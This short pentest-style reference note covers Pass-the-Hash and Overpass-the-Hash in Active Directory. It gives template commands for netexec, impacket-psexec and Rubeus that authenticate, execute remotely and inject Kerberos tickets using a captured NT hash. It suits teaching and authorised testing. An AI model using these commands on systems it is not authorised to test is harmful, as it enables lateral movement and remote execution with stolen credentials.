# 18.02 Pass-the-Hash Overpass-the-Hash

> Hit NTLM auth with the raw NT hash (PtH), or use the hash to request a fresh TGT (OPtH) for cleaner Kerberos traffic.

## Overview

PtH: use NT hash directly via NTLM. OPtH: use hash to request a fresh TGT (cleaner — Kerberos traffic).

## Steps

- **PtH** — `netexec smb -H` / impacket -hashes.
- **OPtH** — Rubeus asktgt /rc4: → TGT into session.

## Commands

### PtH + OPtH

```bash
# PtH
netexec smb <TARGET> -u <USER> -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0...
impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes :<NT>
# OPtH (Rubeus on Windows session)
Rubeus.exe asktgt /user:<USER> /rc4:<NT> /ptt
klist; dir \\\\srv01\\C$
```
